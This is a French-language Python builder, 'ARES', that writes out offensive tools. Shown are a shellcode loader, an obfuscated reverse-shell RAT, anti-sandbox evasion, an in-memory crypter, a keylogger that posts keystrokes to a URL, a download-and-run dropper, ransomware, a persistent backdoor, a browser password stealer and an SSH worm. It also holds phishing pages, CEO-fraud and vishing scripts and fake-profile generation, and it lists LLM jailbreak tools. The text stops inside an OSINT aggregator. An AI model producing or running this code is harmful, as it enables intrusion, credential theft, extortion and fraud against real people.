# ares_toolkit.py — ARES, suite offensive de la mythologie grecque
# Python 3.10+ | pip install -r requirements.txt

import os, sys, textwrap
from colorama import Fore, Style, init
init(autoreset=True)

BANNER = r"""
    ▄▀▄ ▄▀▄ █ ▄▀▄ █▀▄ ▄▀▀ ▀▄▀ █▄█ ▄▀▀ █▀█ █ █ █▀▄ ▄▀▀
    █▄█ █▀▄ █ █▄█ █▄▀ ▀▄▄ █ █ █ █ ▀▄▄ █▀▄ █▄█ █▄▀ ▀▄▄
     ═══════ ARES — SUITE OFFENSIVE — L'ARÈTE DE LA GUERRE ═══════
"""

MENU = """
{g}═══ PHALANGE I — CODE OFFENSIF ══════════════════{r}
{g}[11]{r} Proteus       — shellcode polymorphique
{g}[12]{r} Dedale        — RAT builder + obfuscation
{g}[13]{r} Sphinx        — payload anti-sandbox
{g}[14]{r} Hades         — memory crypter AES-256-GCM
{g}[15]{r} Hermes        — RAT simple asyncio
{g}[16]{r} Argos         — keylogger pynput (cent yeux)
{g}[17]{r} Prometheus    — dropper (porte le feu)
{g}[18]{r} Charon        — ransomware démo (passe ou péris)
{g}[19]{r} Atlas         — backdoor persistant
{g}[1A]{r} Kerberos      — stealer Chrome + clipboard
{g}[1B]{r} Hydra         — worm LAN spreader

{g}═══ PHALANGE II — SOCIAL ENGINEERING ════════════{r}
{g}[21]{r} Metis         — manipulation psychologique (Cialdini)
{g}[22]{r} Syrenes       — phishing kit OSINT-driven
{g}[23]{r} Chimera       — faux profils réseaux sociaux
{g}[24]{r} Echo          — scripts vishing structurés

{g}═══ PHALANGE III — OSINT / RENSEIGNEMENT ════════{r}
{g}[31]{r} Panoptes      — agrégateur OSINT (cent yeux)
{g}[32]{r} Moires        — deanonymiseur stylométrique
{g}[33]{r} Heracles      — credential stuffer async

{g}═══ PHALANGE IV — FICTION NON CENSURÉE ═════════{r}
{g}[41]{r} Erinyes       — fiction dark / gore
{g}[42]{r} Aphrodite     — érotique adulte explicite
{g}[43]{r} Sibylle       — propagande fictive worldbuilding

{g}═══ PHALANGE VI — IA DANS L'IA ══════════════════{r}
{g}[61]{r} Icare         — générateur de jailbreaks LLM
{g}[62]{r} Athena        — red team LLM simulator
{g}[63]{r} Pygmalion     — persona engine, system prompts
{g}[64]{r} Muses         — dataset generator JSONL

{g}[0]{r}  Quitte l'Arène
""".format(g=Fore.GREEN, r=Style.RESET_ALL)

OUT_DIR = "output"
os.makedirs(OUT_DIR, exist_ok=True)


def outdent(text: str) -> str:
    """retire exactement 8 espaces d'indentation de base ; les lignes à <8 espaces
    (templates f-string, HTML, JSON) restent tels quels"""
    out = []
    for ln in text.split("\n"):
        if ln.startswith("        "):
            out.append(ln[8:])
        else:
            out.append(ln)
    return "\n".join(out)

def write_file(filename: str, content: str) -> str:
    path = os.path.join(OUT_DIR, filename)
    with open(path, "w", encoding="utf-8") as f:
        f.write(outdent(content))
    print(Fore.GREEN + f"[+] → {path}")
    return path

def ask(prompt: str, default: str = "") -> str:
    v = input(Fore.CYAN + prompt + Style.RESET_ALL).strip()
    return v if v else default

# ══════════════════════════════════════════════
# CAT 1 — CODE OFFENSIF
# ══════════════════════════════════════════════

def build_proteus():
    name = ask("output [proteus.py]: ", "proteus.py")
    code = '''\
        # Polymorphic shellcode wrapper — Python 3.10+ stdlib only
        # XOR encode + stub generation avec noms de vars randomisés
        import os, random, string

        def xor_encode(shellcode: bytes, key: bytes) -> bytes:
            return bytes(b ^ key[i % len(key)] for i, b in enumerate(shellcode))

        def rvar(n: int = 8) -> str:
            pool = string.ascii_lowercase
            return random.choice(pool) + "".join(random.choices(pool, k=n-1))

        def generate_stub(encoded: bytes, key: bytes) -> str:
            ve, vk, vd, vb = rvar(), rvar(), rvar(), rvar()
            junk = "\\n".join(f"    {rvar()} = {random.randint(0, 0xFFFF)}" for _ in range(4))
            return f"""import ctypes
{ve} = {list(encoded)}
{vk} = {list(key)}
{junk}
{vd} = bytes(b ^ {vk}[i % len({vk})] for i, b in enumerate({ve}))
{vb} = ctypes.create_string_buffer({vd}, len({vd}))
_p = ctypes.cast({vb}, ctypes.c_void_p)
_o = ctypes.c_ulong(0)
ctypes.windll.kernel32.VirtualProtect(_p, len({vd}), 0x40, ctypes.byref(_o))
ctypes.cast({vb}, ctypes.CFUNCTYPE(ctypes.c_void_p))()
"""

        # FILL: remplace DEMO_SC par ton shellcode complet (msfvenom/donut)
        DEMO_SC = bytes([0xfc, 0x48, 0x83, 0xe4, 0xf0])
        key     = os.urandom(random.randint(8, 32))
        encoded = xor_encode(DEMO_SC, key)
        stub    = generate_stub(encoded, key)
        with open("poly_stub_out.py", "w") as f:
            f.write(stub)
        print(f"[+] stub → poly_stub_out.py | clé: {key.hex()}")
        print("[!] FILL: colle ton shellcode complet dans DEMO_SC")
    '''
    write_file(name, code)

def build_dedale():
    lhost = ask("LHOST [127.0.0.1]: ", "127.0.0.1")
    lport = ask("LPORT [4444]: ", "4444")
    name  = ask("output [dedale.py]: ", "dedale.py")
    code = f'''\
        # RAT Builder + obfuscation — vars randomisées, strings b64, imports obfusqués
        import base64, random, string, textwrap

        HOST = "{lhost}"
        PORT = {lport}

        def rvar(n=8):
            return random.choice(string.ascii_lowercase) + \\
                   "".join(random.choices(string.ascii_lowercase + string.digits, k=n-1))

        def b64s(s):
            return f'__import__("base64").b64decode({{repr(base64.b64encode(s.encode()).decode())}}).decode()'

        va, vb, vc, vd, ve, vf, vg = [rvar() for _ in range(7)]
        junk = "\\n".join(f"{{rvar()}} = {{random.randint(0,9999)}}" for _ in range(4))

        src = f"""
import asyncio as {{va}}
import subprocess as {{vb}}
{{junk}}
{{vc}} = {{b64s(HOST)}}
{{vd}} = {lport}
async def {{ve}}(r, w):
    while True:
        try: data = await {{va}}.wait_for(r.read(4096), timeout=30)
        except {{va}}.TimeoutError: continue
        if not data: break
        try:
            p = {{vb}}.run(data.decode(errors="replace").strip(),
                shell=True, capture_output=True, text=True, timeout=15)
            out = p.stdout + p.stderr
        except Exception as e: out = str(e)
        w.write((out or "[no output]\\n").encode()); await w.drain()
    w.close()
async def _m():
    while True:
        try:
            r,w = await {{va}}.open_connection({{vc}}, {{vd}})
            await {{ve}}(r,w)
        except OSError: await {{va}}.sleep(5)
{{va}}.run(_m())
"""
        with open("rat_obfuscated.py","w") as f:
            f.write(textwrap.dedent(src))
        print("[+] rat_obfuscated.py")
        print(f"[+] listener: nc -lvnp {lport}")
        print("[+] pack: pyinstaller --onefile --noconsole rat_obfuscated.py")
    '''
    write_file(name, code)

def build_sphinx():
    name = ask("output [sphinx.py]: ", "sphinx.py")
    code = '''\
        # Payload anti-sandbox — VM/debugger/timing/souris/RAM detection
        import os, sys, time, ctypes, subprocess

        def check_vm_registry() -> bool:
            if sys.platform != "win32": return False
            try:
                import winreg
                for k in [r"SOFTWARE\\VMware, Inc.\\VMware Tools",
                           r"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
                           r"SYSTEM\\CurrentControlSet\\Services\\VBoxGuest"]:
                    try: winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, k); return True
                    except FileNotFoundError: pass
            except Exception: pass
            return False

        def check_vm_processes() -> bool:
            procs = {"vmtoolsd.exe","vboxservice.exe","wireshark.exe",
                     "procmon.exe","ollydbg.exe","x64dbg.exe","ida64.exe"}
            try:
                out = subprocess.run(
                    "tasklist" if sys.platform=="win32" else "ps aux",
                    capture_output=True, text=True, timeout=5
                ).stdout.lower()
                return any(p in out for p in procs)
            except Exception: return False

        def check_timing() -> bool:
            start = time.perf_counter()
            for _ in range(1_000_000): pass
            return time.perf_counter() - start > 2.0

        def check_low_resources() -> bool:
            if (os.cpu_count() or 1) < 2: return True
            if sys.platform == "win32":
                try:
                    m = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetPhysicallyInstalledSystemMemory(ctypes.byref(m))
                    if m.value < 2*1024*1024: return True
                except Exception: pass
            return False

        def check_no_mouse() -> bool:
            if sys.platform != "win32": return False
            try:
                class PT(ctypes.Structure):
                    _fields_ = [("x",ctypes.c_long),("y",ctypes.c_long)]
                p1,p2 = PT(),PT()
                ctypes.windll.user32.GetCursorPos(ctypes.byref(p1))
                time.sleep(3)
                ctypes.windll.user32.GetCursorPos(ctypes.byref(p2))
                return p1.x==p2.x and p1.y==p2.y
            except Exception: return False

        def is_sandbox() -> bool:
            return sum([check_vm_registry(), check_vm_processes(),
                        check_timing(), check_low_resources(), check_no_mouse()]) >= 2

        def real_payload():
            print("[+] environnement réel — payload lancé")
            # FILL: ton payload ici

        if is_sandbox():
            time.sleep(86400); sys.exit(0)
        else:
            real_payload()
    '''
    write_file(name, code)

def build_hades():
    name = ask("output [hades.py]: ", "hades.py")
    code = '''\
        # Memory crypter AES-256-GCM — déchiffrement en RAM uniquement
        # deps: pycryptodome
        from Crypto.Cipher import AES
        from Crypto.Protocol.KDF import PBKDF2
        from Crypto.Random import get_random_bytes
        import ctypes, sys, os

        PASSWORD = b"FILL_YOUR_PASSWORD_HERE"  # FILL

        def derive_key(pw: bytes, salt: bytes) -> bytes:
            return PBKDF2(pw, salt, dkLen=32, count=200_000)

        def encrypt(payload: bytes):
            salt   = get_random_bytes(16)
            key    = derive_key(PASSWORD, salt)
            cipher = AES.new(key, AES.MODE_GCM)
            ct, tag = cipher.encrypt_and_digest(payload)
            return salt, cipher.nonce, tag, ct

        def decrypt_and_run(salt: bytes, nonce: bytes, tag: bytes, ct: bytes):
            payload = AES.new(derive_key(PASSWORD,salt), AES.MODE_GCM,
                              nonce=nonce).decrypt_and_verify(ct, tag)
            if sys.platform == "win32":
                buf  = ctypes.create_string_buffer(payload, len(payload))
                ptr  = ctypes.cast(buf, ctypes.c_void_p)
                old  = ctypes.c_ulong(0)
                ctypes.windll.kernel32.VirtualProtect(ptr,len(payload),0x40,ctypes.byref(old))
                ctypes.cast(buf, ctypes.CFUNCTYPE(ctypes.c_void_p))()
            else:
                fd = os.memfd_create("payload", 0)
                os.write(fd, payload); os.lseek(fd, 0, os.SEEK_SET)
                os.execve(f"/proc/self/fd/{fd}", ["payload"], os.environ)

        # démo
        DEMO = b"\\x90" * 64  # FILL: ton shellcode
        salt, nonce, tag, ct = encrypt(DEMO)
        print(f"[+] salt:{salt.hex()} nonce:{nonce.hex()} tag:{tag.hex()}")
        print("[+] appelle decrypt_and_run(salt,nonce,tag,ct) pour exécuter")
    '''
    write_file(name, code)

def build_hermes():
    lhost = ask("LHOST [127.0.0.1]: ", "127.0.0.1")
    lport = ask("LPORT [4444]: ", "4444")
    name  = ask("output [hermes.py]: ", "hermes.py")
    code = f'''\
        # RAT client simple — asyncio reverse shell Python 3.10+
        # listener: nc -lvnp {lport}
        import asyncio, subprocess

        HOST = "{lhost}"
        PORT = {lport}
        RECONNECT_DELAY = 5

        async def shell(reader, writer):
            while True:
                try: data = await asyncio.wait_for(reader.read(4096), timeout=30)
                except asyncio.TimeoutError: continue
                if not data: break
                cmd = data.decode(errors="replace").strip()
                if cmd.lower() in ("exit","quit"): break
                try:
                    r = subprocess.run(cmd, shell=True, capture_output=True,
                                       text=True, timeout=15)
                    out = r.stdout + r.stderr
                except subprocess.TimeoutExpired: out = "[timeout]\\n"
                except Exception as e: out = f"[error] {{e}}\\n"
                writer.write((out or "[no output]\\n").encode())
                await writer.drain()
            writer.close()

        async def connect():
            while True:
                try:
                    r, w = await asyncio.open_connection(HOST, PORT)
                    await shell(r, w)
                except (ConnectionRefusedError, OSError): pass
                await asyncio.sleep(RECONNECT_DELAY)

        if __name__ == "__main__":
            asyncio.run(connect())
    '''
    write_file(name, code)

def build_argos():
    logfile = ask("log file [keys.txt]: ", "keys.txt")
    exfil   = ask("exfil URL (vide = file only): ", "")
    name    = ask("output [argos.py]: ", "argos.py")
    exfil_block = f'''\
        import requests as _r
        def _send(t):
            try: _r.post("{exfil}", data={{"log":t}}, timeout=5)
            except Exception: pass
    ''' if exfil else "def _send(t): pass"
    code = f'''\
        # Keylogger pynput — log fichier + exfil optionnel
        # deps: pynput requests
        from pynput import keyboard
        from pathlib import Path
        import threading, time

        LOG  = Path("{logfile}")
        FLUSH_N = 50
        _buf: list[str] = []
        _lock = threading.Lock()

        {exfil_block}

        def _flush():
            with _lock:
                if not _buf: return
                chunk = "".join(_buf); _buf.clear()
            with LOG.open("a", encoding="utf-8") as f: f.write(chunk)
            _send(chunk)

        def on_press(key):
            try: ch = key.char or ""
            except AttributeError: ch = f"[{{key.name}}]"
            with _lock:
                _buf.append(ch)
                if len(_buf) >= FLUSH_N:
                    threading.Thread(target=_flush, daemon=True).start()

        def _periodic():
            while True: time.sleep(10); _flush()

        threading.Thread(target=_periodic, daemon=True).start()
        with keyboard.Listener(on_press=on_press) as l: l.join()
    '''
    write_file(name, code)

def build_prometheus():
    url  = ask("payload URL [https://example.com/p.exe]: ", "https://example.com/p.exe")
    name = ask("output [prometheus.py]: ", "prometheus.py")
    code = f'''\
        # Dropper — télécharge + exécute second stage
        # deps: requests
        import requests, tempfile, os, subprocess, sys

        PAYLOAD_URL = "{url}"
        MAX_BYTES   = 50 * 1024 * 1024

        def fetch(url: str) -> bytes:
            resp = requests.get(url, stream=True, timeout=15)
            resp.raise_for_status()
            chunks, total = [], 0
            for chunk in resp.iter_content(65536):
                total += len(chunk)
                if total > MAX_BYTES: raise ValueError("payload trop lourd")
                chunks.append(chunk)
            return b"".join(chunks)

        def drop_and_run(data: bytes):
            suffix = ".exe" if sys.platform=="win32" else ""
            fd, path = tempfile.mkstemp(suffix=suffix)
            try:
                os.write(fd, data); os.close(fd); os.chmod(path, 0o700)
                subprocess.Popen([path], close_fds=True)
            except Exception: os.close(fd); raise

        drop_and_run(fetch(PAYLOAD_URL))
    '''
    write_file(name, code)

def build_charon():
    target_dir = ask("target dir [./test_victim]: ", "./test_victim")
    ext        = ask("extension chiffrée [.locked]: ", ".locked")
    name       = ask("output [charon.py]: ", "charon.py")
    code = f'''\
        # Ransomware DEMO — AES-256-CBC, répertoire local uniquement, clé stdout
        # deps: pycryptodome
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad, unpad
        from Crypto.Random import get_random_bytes
        from pathlib import Path
        import sys

        TARGET = Path("{target_dir}")
        EXT    = "{ext}"
        SKIP   = {{".py",".exe",".dll",EXT}}

        def enc(path: Path, key: bytes):
            iv = get_random_bytes(16)
            ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(path.read_bytes(), 16))
            path.with_suffix(path.suffix+EXT).write_bytes(iv+ct)
            path.unlink()

        def dec(path: Path, key: bytes):
            raw = path.read_bytes(); iv,ct = raw[:16],raw[16:]
            pt  = unpad(AES.new(key,AES.MODE_CBC,iv).decrypt(ct), 16)
            Path(str(path)[:-len(EXT)]).write_bytes(pt); path.unlink()

        if __name__ == "__main__":
            mode = sys.argv[1] if len(sys.argv)>1 else "encrypt"
            if mode == "encrypt":
                key = get_random_bytes(32)
                print(f"[KEY] {{key.hex()}}  ← save this")
                for p in TARGET.rglob("*"):
                    if p.is_file() and p.suffix not in SKIP:
                        enc(p, key); print(f"  enc {{p}}")
            elif mode == "decrypt":
                if len(sys.argv)<3: sys.exit("usage: charon.py decrypt <hex_key>")
                key = bytes.fromhex(sys.argv[2])
                for p in TARGET.rglob(f"*{{EXT}}"):
                    dec(p, key); print(f"  dec {{p}}")
    '''
    write_file(name, code)
    print(Fore.MAGENTA + "  → python output/charon.py encrypt")
    print(Fore.MAGENTA + "  → python output/charon.py decrypt <hex_key>")

def build_atlas():
    lhost = ask("LHOST [127.0.0.1]: ", "127.0.0.1")
    lport = ask("LPORT [5555]: ", "5555")
    name  = ask("output [atlas.py]: ", "atlas.py")
    code = f'''\
        # Backdoor persistant — HKCU Run (Windows) / cron @reboot (Linux)
        import asyncio, subprocess, sys, os
        from pathlib import Path

        HOST = "{lhost}"
        PORT = {lport}

        def install():
            p = str(Path(sys.argv[0]).resolve())
            if sys.platform == "win32":
                import winreg
                k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k,"WindowsUpdate",0,winreg.REG_SZ,f'pythonw "{p}"')
                winreg.CloseKey(k)
            else:
                os.system(f'(crontab -l 2>/dev/null; echo "@reboot python3 {{p}}") | crontab -')

        async def shell(r, w):
            while True:
                try: data = await asyncio.wait_for(r.read(4096), timeout=60)
                except asyncio.TimeoutError: continue
                if not data: break
                try:
                    out = subprocess.run(data.decode(errors="replace").strip(),
                        shell=True,capture_output=True,text=True,timeout=20)
                    res = out.stdout+out.stderr
                except Exception as e: res=str(e)
                w.write((res or "[no output]\\n").encode()); await w.drain()
            w.close()

        async def run():
            install()
            while True:
                try:
                    r,w = await asyncio.open_connection(HOST,PORT)
                    await shell(r,w)
                except OSError: await asyncio.sleep(10)

        asyncio.run(run())
    '''
    write_file(name, code)
    print(Fore.MAGENTA + f"  → listener: nc -lvnp {lport}")

def build_kerberos():
    name = ask("output [kerberos.py]: ", "kerberos.py")
    code = '''\
        # Stealer — Chrome/Edge login db + clipboard
        # deps: pyperclip pycryptodome pywin32 (Windows)
        import os,sys,json,shutil,sqlite3,base64,tempfile
        from pathlib import Path

        R = {"clipboard":"","chrome":[],"edge":[]}

        try:
            import pyperclip; R["clipboard"] = pyperclip.paste()
        except Exception as e: R["clipboard"] = str(e)

        if sys.platform == "win32":
            try:
                import win32crypt
                from Crypto.Cipher import AES

                def _key(bp: Path) -> bytes:
                    ls = json.loads((bp.parent/"Local State").read_text())
                    return win32crypt.CryptUnprotectData(
                        base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:],
                        None,None,None,0)[1]

                def _dec(ct: bytes, key: bytes) -> str:
                    if ct[:3]==b"v10":
                        return AES.new(key,AES.MODE_GCM,ct[3:15]).decrypt(ct[15:-16]).decode(errors="replace")
                    return win32crypt.CryptUnprotectData(ct,None,None,None,0)[1]

                def _harvest(profile: Path, label: str):
                    db = profile/"Login Data"
                    if not db.exists(): return
                    key = _key(profile)
                    tmp = Path(tempfile.mktemp(suffix=".db"))
                    shutil.copy2(db, tmp)
                    try:
                        conn = sqlite3.connect(tmp)
                        for url,user,pw_enc in conn.execute(
                            "SELECT origin_url,username_value,password_value FROM logins"):
                            try: pw = _dec(pw_enc, key)
                            except Exception: pw = "[fail]"
                            R[label].append({"url":url,"user":user,"pw":pw})
                        conn.close()
                    finally: tmp.unlink(missing_ok=True)

                _a = Path(os.environ["LOCALAPPDATA"])
                _harvest(_a/"Google/Chrome/User Data/Default", "chrome")
                _harvest(_a/"Microsoft/Edge/User Data/Default",  "edge")
            except Exception as e: R["chrome"]=[{"error":str(e)}]

        out = Path("output/stolen.json")
        out.write_text(json.dumps(R,indent=2,ensure_ascii=False))
        print(f"[+] → {out}")
    '''
    write_file(name, code)

def build_hydra():
    name = ask("output [hydra.py]: ", "hydra.py")
    code = '''\
        # Worm LAN spreader — scan /24, copie via SSH paramiko
        # deps: paramiko netifaces
        import socket,threading,sys,os
        from pathlib import Path
        import netifaces,paramiko

        CREDS    = [("admin","admin"),("root","toor"),("pi","raspberry")]  # FILL
        PORT     = 22
        TIMEOUT  = 2
        SELF     = Path(sys.argv[0]).resolve()
        REMOTE   = "/tmp/.update"

        def subnet() -> str:
            for iface in netifaces.interfaces():
                for a in netifaces.ifaddresses(iface).get(netifaces.AF_INET,[]):
                    ip = a.get("addr","")
                    if not ip.startswith("127."): return ".".join(ip.split(".")[:3])
            return "192.168.1"

        def spread(ip: str):
            for user,pw in CREDS:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip,PORT,user,pw,timeout=TIMEOUT,banner_timeout=TIMEOUT)
                    sftp = ssh.open_sftp()
                    sftp.put(str(SELF),REMOTE); sftp.chmod(REMOTE,0o700); sftp.close()
                    ssh.exec_command(f"nohup python3 {REMOTE} &"); ssh.close()
                    print(f"[+] {ip} ({user})"); return
                except Exception: continue

        def run():
            sub = subnet()
            ts  = [threading.Thread(target=spread,args=(f"{sub}.{i}",),daemon=True)
                   for i in range(1,255)]
            for t in ts: t.start()
            for t in ts: t.join()

        run()
    '''
    write_file(name, code)

# ══════════════════════════════════════════════
# CAT 2 — SOCIAL ENGINEERING
# ══════════════════════════════════════════════

def build_metis():
    name = ask("output [metis.py]: ", "metis.py")
    code = '''\
        # Scripts manipulation psychologique — 6 leviers Cialdini
        LEVIERS = {
            "urgence":      "Deadline artificielle, panique douce",
            "autorité":     "Figure légitime (IT, banque, gov)",
            "réciprocité":  "Donne d'abord pour créer une dette",
            "preuve sociale":"'Vos collègues ont déjà...'",
            "sympathie":    "Miroir du style, prénom, flattery",
            "engagement":   "Petits oui progressifs avant la vraie demande",
        }
        TEMPLATES = {
        "credential_harvest":"""
        Bonjour {prenom}, c'est {nom} du support IT de {entreprise}.
        On a détecté une tentative d'accès suspecte il y a 20 minutes.
        [URGENCE] Votre accès sera suspendu dans 10 minutes.
        Confirmez votre identifiant et le code SMS que vous venez de recevoir.
        """,
        "virement":"""
        {prenom}, c'est {nom}, DG de {entreprise}.
        Virement urgent confidentiel — {montant}€ avant 16h.
        IBAN: {iban}  Réf: CONF-{ref}
        Ne pas en parler en interne. Procédure exceptionnelle.
        """,
        "acces_physique":"""
        Bonjour, je suis {nom}, prestataire réseau mandaté par votre DSI.
        Ticket ouvert pour intervenir en salle serveur.
        Votre responsable {manager} m'a dit de passer directement.
        """,
        }
        def gen(k,**kw):
            t=TEMPLATES.get(k,"?")
            for a,b in kw.items(): t=t.replace(f"{{{a}}}",str(b))
            return t
        if __name__=="__main__":
            print(gen("credential_harvest",prenom="Marie",nom="T. Dupont",entreprise="Acme"))
    '''
    write_file(name, code)

def build_syrenes():
    name = ask("output [syrenes.py]: ", "syrenes.py")
    code = '''\
        # Phishing kit OSINT-driven — email spear-phishing + landing page
        # deps: requests bs4
        import requests,json
        from pathlib import Path
        import datetime

        def spear_email(t_name,t_email,company,s_name,s_title,url):
            return f"""From: {s_name} <no-reply@{company.lower().replace(' ','')}-secure.com>
To: {t_email}
Subject: [ACTION REQUISE] Document partagé — {company}

Bonjour {t_name},

{s_name} ({s_title} chez {company}) a partagé un document confidentiel.
Validation requise avant le {datetime.date.today().strftime('%d/%m/%Y')}.

→ {url}

Ce lien expire dans 24h.
{s_name} — {s_title}, {company}
"""

        def landing(brand,redirect):
            return f"""<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8">
<title>{brand} — Authentification</title>
<style>body{{font-family:sans-serif;background:#f0f2f5;display:flex;align-items:center;
justify-content:center;height:100vh;margin:0}}
.b{{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1);width:360px}}
h2{{margin:0 0 24px;text-align:center}}input{{width:100%;padding:10px;margin-bottom:16px;
border:1px solid #ccc;border-radius:6px;box-sizing:border-box}}
button{{width:100%;padding:11px;background:#0078d4;color:#fff;border:none;border-radius:6px;cursor:pointer}}
</style></head><body><div class="b"><h2>🔒 {brand}</h2>
<form method="POST" action="/login">
<input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Mot de passe" required>
<button>Accéder</button></form></div></body></html>"""

        if __name__=="__main__":
            brand  = input("Brand [Microsoft]: ") or "Microsoft"
            t_name = input("Nom cible: ") or "Jean Dupont"
            t_mail = input("Email cible: ") or "cible@example.com"
            co     = input("Entreprise: ") or "Acme"
            url    = input("URL payload: ") or "http://localhost:8080"
            s_name = input("Expéditeur: ") or "Marc Leroy"
            s_ttl  = input("Titre: ") or "IT Manager"
            Path("output/spear_email.txt").write_text(spear_email(t_name,t_mail,co,s_name,s_ttl,url))
            Path("output/phish_landing.html").write_text(landing(brand,"https://microsoft.com"))
            print("[+] output/spear_email.txt  output/phish_landing.html")
    '''
    write_file(name, code)

def build_chimera():
    name = ask("output [chimera.py]: ", "chimera.py")
    code = '''\
        # Générateur faux profils réseaux sociaux — backstory + posts + photo prompt
        import random,json,datetime
        from pathlib import Path
        FN_M=["Théo","Lucas","Maxime","Antoine","Nicolas","Julien","Alexandre"]
        FN_F=["Léa","Emma","Camille","Chloé","Manon","Sarah","Julie"]
        LN  =["Martin","Bernard","Thomas","Petit","Robert","Richard","Durand"]
        CITIES=["Paris","Lyon","Marseille","Bordeaux","Toulouse","Nantes","Lille"]
        JOBS  =["Commercial","Développeur","Infirmière","Comptable","Graphiste","Enseignant"]
        INT   =["randonnée","cuisine","photo","gaming","fitness","voyage","lecture","musique"]
        POSTS =["Super journée 😊","Qui a des conseils pour {i} ?",
                "Lundi matin... ☕","Fier de finir ce projet !",
                "Top resto à {c} hier soir","Contrat signé 🎉","{i} ça ressource vraiment"]

        def profile(gender="M"):
            fn=random.choice(FN_M if gender=="M" else FN_F)
            ln=random.choice(LN); city=random.choice(CITIES)
            job=random.choice(JOBS); age=random.randint(22,45)
            interests=random.sample(INT,3)
            posts=[]
            for _ in range(random.randint(8,15)):
                d=datetime.date.today()-datetime.timedelta(days=random.randint(1,30))
                posts.append({"date":str(d),"text":random.choice(POSTS)
                    .replace("{i}",random.choice(interests)).replace("{c}",city)})
            posts.sort(key=lambda x:x["date"],reverse=True)
            return {"name":f"{fn} {ln}","username":f"{fn.lower()}.{ln.lower()}{random.randint(10,99)}",
                    "age":age,"city":city,"job":job,"interests":interests,
                    "bio":f"{job} à {city} · {interests[0]} · {2024-age}",
                    "posts":posts,
                    "photo_prompt":f"Portrait, {'man' if gender=='M' else 'woman'}, {age}yo, friendly, casual, realistic LinkedIn headshot"}

        if __name__=="__main__":
            n=int(input("Combien [5]: ") or "5")
            ps=[profile(random.choice(["M","F"])) for _ in range(n)]
            Path("output/fake_profiles.json").write_text(json.dumps(ps,indent=2,ensure_ascii=False))
            print(f"[+] {n} profils → output/fake_profiles.json")
    '''
    write_file(name, code)

def build_echo():
    name = ask("output [echo.py]: ", "echo.py")
    code = '''\
        # Scripts vishing structurés — ouverture / corps / objections / escalade
        SCRIPTS = {
        "it_support":{
            "persona":"Support IT interne",
            "objectif":"Credentials VPN / MFA",
            "ouverture":"Bonjour {prenom} ? Ici {nom} du support IT de {co}. Alerte connexion inhabituelle depuis {pays} il y a 40 min.",
            "corps":"Je dois sécuriser votre accès. Je vous envoie un code SMS — lisez-le moi.",
            "objections":{
                "je vais rappeler":"Notre ticket se ferme dans 8 min, accès suspendu auto. Ticket: {ticket}.",
                "votre numéro":"On appelle depuis la plateforme interne — s'affiche anonyme.",
            },
            "escalade":"Je passe à mon responsable si vous voulez — 15-20 min, compte toujours exposé.",
        },
        "banque":{
            "persona":"Service fraude bancaire",
            "objectif":"Codes carte / virement annulation",
            "ouverture":"Bonjour, {nom} du service sécurité {banque}. Transaction suspecte {montant}€ bloquée. C'est vous ?",
            "corps":"Pour annuler: confirmez les 4 derniers chiffres de votre carte.",
            "objections":{"default":"Prudence normale — mais si on attend, la transaction passe définitivement."},
        },
        }
        def print_script(k,**kw):
            s=SCRIPTS.get(k)
            if not s: return
            print(f"\\nPERSONA: {s['persona']} | OBJECTIF: {s['objectif']}")
            for sec in ["ouverture","corps","escalade"]:
                if sec in s:
                    t=s[sec]
                    for a,b in kw.items(): t=t.replace(f"{{{a}}}",str(b))
                    print(f"[{sec.upper()}] {t}")
            print("[OBJECTIONS]")
            for obj,rep in s["objections"].items():
                for a,b in kw.items(): rep=rep.replace(f"{{{a}}}",str(b))
                print(f"  · {obj}: {rep}")
        if __name__=="__main__":
            print(list(SCRIPTS.keys()))
            k=input("Script [it_support]: ") or "it_support"
            print_script(k,prenom="Marie",nom="T.Martin",co="Acme",
                pays="Russie",ticket="INC-48291",banque="BNP",montant="1247")
    '''
    write_file(name, code)

# ══════════════════════════════════════════════
# CAT 3 — OSINT
# ══════════════════════════════════════════════

def build_panoptes():
    name = ask("output [panoptes.py]: ", "panoptes.py")
    code = '''\
        # Agrégateur OSINT — WHOIS + DNS + Shodan + HIBP + reverse IP
        # deps: requests python-whois shodan
        import requests,json,socket
        from pathlib import Path
        from datetime import datetime, timezone

        SHODAN_KEY = "FILL_SHODAN_API_KEY"
        HIBP_KEY   = "FILL_HIBP_API_KEY"

        def whois(domain):
            try:
                import whois; w=whois.whois(domain)
                return {"registrar":str(w.registrar),"created":str(w.creation_date),
                        "ns":w.name_servers,"emails":w.emails}
            except Exception as e: return {"error":str(e)}

        def dns(domain):
            r={}
            for qt in ["A","MX","TXT","NS"]:
                try:
                    import subprocess
                    r[qt]=subprocess.run(["nslookup",f"-type={qt}",domain],
                        capture_output=True,text=True,timeout=5).stdout
                except Exception as e: r[qt]=str(e)
            return r

        def shodan(ip):
            if not SHODAN_KEY or SHODAN_KEY.startswith("FILL"): return {"info":"pas de clé Shodan — sources locales utilisées"}
            try:
                d=requests.get(f"https://api.shodan.io/shodan/host/{ip}",
                    params={"key":SHODAN_KEY},timeout=10).json()
                return {"ports":d.get("ports",[]),"org":d.get("org"),
                        "vulns":list(d.get("vulns",{}).keys()),"country":d.get("country_name")}
            except Exception as e: return {"error":str(e)}

        def hibp(email):
            if not HIBP_KEY or HIBP_KEY.startswith("FILL"): return {"info":"pas de clé HIBP — whois/DNS/reverse fonctionnent sans"}
            try:
                r=requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}",
                    headers={"hibp-api-key":HIBP_KEY,"user-agent":"osint"},timeout=10)
                return {"breaches":[]} if r.status_code==404 else {"breaches":[b["Name"] for b in r.json()]}
            except Exception as e: return {"error":str(e)}

        def reverse_ip(ip):
            try: return requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}",timeout=10).text.strip().splitlines()
            except: return []

        def run(target):
            report={"target":target,"ts":datetime.now(timezone.utc).isoformat()}
